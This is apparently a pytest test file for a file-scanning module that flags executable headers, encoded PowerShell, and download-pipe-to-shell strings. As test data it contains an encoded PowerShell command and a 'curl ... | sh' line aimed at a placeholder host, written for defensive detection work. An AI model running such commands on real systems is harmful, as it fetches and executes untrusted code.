from __future__ import annotations

import pytest

from ark.security.virus import VirusFlagged, heuristics, scan_bytes, scan_bytes_or_raise


def test_mode_e_flags_mz() -> None:
    findings = heuristics(b"MZ" + b"\x00" * 20)
    assert any("PE/MZ" in f.detail for f in findings)
    with pytest.raises(VirusFlagged):
        scan_bytes_or_raise(b"MZ" + b"this is a fake pe")


def test_plaintext_text_allowed() -> None:
    data = b"just a plain text note for the vault"
    _h, findings = scan_bytes(data)
    assert findings == []
    scan_bytes_or_raise(data)


def test_elf_flagged() -> None:
    data = b"\x7fELF" + b"\x00" * 16
    assert any("ELF" in f.detail for f in heuristics(data))


def test_powershell_enc_flagged() -> None:
    data = b"powershell -enc SQBFAFgA"
    assert any("PowerShell" in f.detail for f in heuristics(data))


def test_curl_sh_flagged() -> None:
    data = b"curl https://example.invalid/x | sh"
    assert any("download-pipe-exec" in f.detail for f in heuristics(data))
